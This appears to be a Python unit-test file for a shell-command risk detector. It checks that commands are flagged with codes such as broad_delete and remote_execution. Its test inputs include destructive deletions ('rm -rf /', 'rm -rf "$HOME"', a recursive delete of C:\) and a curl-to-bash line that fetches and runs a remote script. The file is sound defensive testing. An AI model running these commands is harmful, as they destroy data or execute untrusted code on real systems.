from src.schemas import RiskLevel, Shell
from src.shell_rules import detect_risks, detect_risks_by_statement


def test_recursive_root_delete_is_critical():
    findings = detect_risks("rm -rf /", Shell.BASH)
    assert any(item.code == "deletion" and item.level == RiskLevel.HIGH for item in findings)
    assert any(item.code == "broad_delete" and item.level == RiskLevel.CRITICAL for item in findings)


def test_download_then_pipe_to_shell_is_detected():
    findings = detect_risks("curl https://example.invalid/script.sh | bash", Shell.BASH)
    assert any(item.code == "remote_execution" and item.level == RiskLevel.CRITICAL for item in findings)


def test_static_detection_covers_multiple_requested_categories():
    codes = {item.code for item in detect_risks('echo "$HOME/file name" > output.txt | cat', Shell.BASH)}
    assert {"overwrite", "composition", "variable_expansion", "quoting_escaping", "path_semantics"} <= codes


def test_converted_result_findings_keep_their_origin():
    finding = detect_risks("Remove-Item file.tmp", Shell.POWERSHELL, origin="converted")[0]
    assert finding.origin == "converted"


def test_home_reference_on_other_line_does_not_make_precise_delete_broad():
    command = 'echo "$HOME"\nrm -rf /tmp/test\ncurl https://example.invalid/script.sh | bash\necho hello > output.txt'
    findings = detect_risks_by_statement(command, Shell.BASH)
    codes = {item.code for item in findings}
    assert "deletion" in codes
    assert "remote_execution" in codes
    assert "broad_delete" not in codes
    deletion = next(item for item in findings if item.code == "deletion")
    assert deletion.statement_index == 2


def test_actual_broad_delete_targets_remain_critical():
    for command in ('rm -rf /', 'rm -rf "$HOME"', 'rm -rf /tmp/*', 'Remove-Item C:\\ -Recurse'):
        findings = detect_risks(command, Shell.BASH)
        assert any(item.code == "broad_delete" and item.level == RiskLevel.CRITICAL for item in findings), command
